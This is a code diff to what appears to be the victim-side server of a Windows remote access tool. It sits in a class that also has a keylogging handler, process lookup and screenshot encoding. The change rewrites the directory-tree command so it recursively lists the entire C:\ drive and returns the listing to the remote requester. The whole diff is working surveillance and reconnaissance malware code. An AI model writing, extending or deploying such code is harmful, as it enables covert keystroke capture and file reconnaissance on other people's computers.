@@ -3,7 +3,6 @@
 #include <string.h> 
 #include <sys/types.h> 
 #include <signal.h>
-#include <string>
 #include <psapi.h>
 #include <filesystem>
 #include <tlhelp32.h>
@@ -448,14 +447,13 @@ Response Server::keyLog(){
 }
     
 Response Server::dirTree(){
+    cout << "Server: Received directory tree instruction.\n";
     uint32_t errCode;
-    stringstream builder;
-    string result;
-
-    printDirectoryTree("C:\\", 0);
+    string result = printDirectoryTree("C:\\", 0);
     
     errCode = OK_CODE;
-    result = builder.str();
+    
+    cout << "Server: Directoried tree.\n";
     return Response(DIR_TREE_RESPONSE, errCode, result.size() + 1, (void*)result.c_str());
 }
 
@@ -479,7 +477,8 @@ DWORD GetProcessIdByName(const char* processName){
     return 0;
 }
 
-void printDirectoryTree(const char* path, int indent){
+string printDirectoryTree(const char* path, int indent){
+    stringstream stream;
     WIN32_FIND_DATAA fd;
     HANDLE hFind = FindFirstFileA((string(path) + "\\*").c_str(), &fd);
 
@@ -487,20 +486,23 @@ void printDirectoryTree(const char* path, int indent){
         do{
             if (strcmp(fd.cFileName, ".") != 0 && strcmp(fd.cFileName, "..") != 0){
                 for (int i = 0; i < indent; i++)
-                    cout << "  ";
+                    stream << "  ";
 
                 if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY){
-                    cout << "[+] " << fd.cFileName << '\n';
-                    printDirectoryTree((string(path) + "\\" + fd.cFileName).c_str(), indent + 1);
+                    stream << "[+] " << fd.cFileName << '\n';
+                    stream << printDirectoryTree((string(path) + "\\" + fd.cFileName).c_str(), indent + 1);
                 }
                 else{
-                    cout << "    " << fd.cFileName << '\n';
+                    stream << "    " << fd.cFileName << '\n';
                 }
             }
         } while (FindNextFileA(hFind, &fd));
 
         FindClose(hFind);
     }
+
+    string result = stream.str();
+    return result;
 }
 
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid){
